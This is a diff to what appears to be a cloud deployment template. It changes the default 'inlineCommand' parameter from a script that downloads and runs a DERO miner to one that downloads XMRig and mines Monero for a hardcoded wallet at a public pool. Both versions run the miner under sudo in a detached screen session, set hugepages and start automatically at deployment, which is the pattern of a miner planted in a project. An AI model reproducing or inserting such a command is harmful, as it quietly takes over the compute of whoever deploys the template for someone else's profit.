@@ -67,7 +67,7 @@
         },
         "inlineCommand": {
             "type": "string",
-            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo apt-get install -y build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git; sudo sysctl -w vm.nr_hugepages=1280; mkdir kkk; cd kkk; wget https://github.com/deroproject/derohe/releases/download/Release114/dero_linux_amd64.tar.gz; tar xf dero_linux_amd64.tar.gz; cd dero_linux_amd64; sudo screen -d -m ./dero-miner-linux-amd64 --wallet-address dero1qyyfg34v967gktykjd3xgwnaaqtd6hcwsppmy40kcvssh6vuj3mquqqwlelav --daemon-rpc-address=minernode1.dero.live:10100",
+            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo apt-get install -y build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git; sudo sysctl -w vm.nr_hugepages=1280; mkdir kkk; cd kkk; wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz; tar xf xmrig-6.18.1-linux-static-x64.tar.gz; cd xmrig-6.18.1; sudo screen -d -m ./xmrig -o pool.supportxmr.com:3333 -a rx -u 852LHMUNWPBMGiR85yJ75XKkRPRWJmQBMjfJP36CApc9G2j8HFCoCtDazQwupheNjABLhzN41wfHrG6CYfr79W74PT9MUsF -p LuckyShinichi --donate-level 1 -k --randomx-1gb-pages -t 16",
             "metadata": {
                 "description": "inline command"
             }
